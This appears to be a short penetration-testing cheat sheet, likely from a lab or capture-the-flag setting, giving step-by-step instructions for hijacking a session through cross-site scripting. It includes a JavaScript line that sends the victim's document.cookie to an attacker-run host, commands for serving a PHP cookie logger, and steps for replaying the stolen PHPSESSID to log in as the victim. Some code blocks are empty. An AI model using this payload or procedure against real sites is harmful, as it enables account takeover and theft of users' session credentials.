# XSS-based Session Hijacking

🔧 Step-by-Step Setup🧠 1. Payload to Inject (XSS) Inject this into the vulnerable input field (comment box, name field, etc.):
```

```
🧨 2. Create script.js (JS Payload) This script will be loaded by the victim’s browser:
```
new Image().src='http://10.10.14.63/index.php?c='+document.cookie;
```
🐘 3. Create index.php (Cookie Logger) This is the PHP backend to receive and log the cookie.
```

```
🚀 4. Host Your Server You can run a local PHP server with the following command inside the folder containing script.js and index.php:
```
php -S 0.0.0.0:80
```
If you’re running it on port 80, make sure nothing else (like Apache) is using it. You can also use port 8080:
```
php -S 0.0.0.0:8080
```
Just remember to change the payload URL if you’re not using port 80:🎯 5. Catch the Cookie Once the victim visits the page:- The browser loads script.js
- The cookie is sent via GET to index.php?c=...
- Your server logs this in cookies.txt
Example output:🛂 6. Replay Session Cookie In Firefox:- Visit target site
- Press F12 → Storage → Cookies
- Click the site → Add cookie:Name: PHPSESSID
- Value: abcdef123456
- Refresh the page — you should be logged in as the victim.
Last updated 10 months ago
```

```

```
Victim IP: 10.10.10.10 | Cookie: PHPSESSID=abcdef123456
```
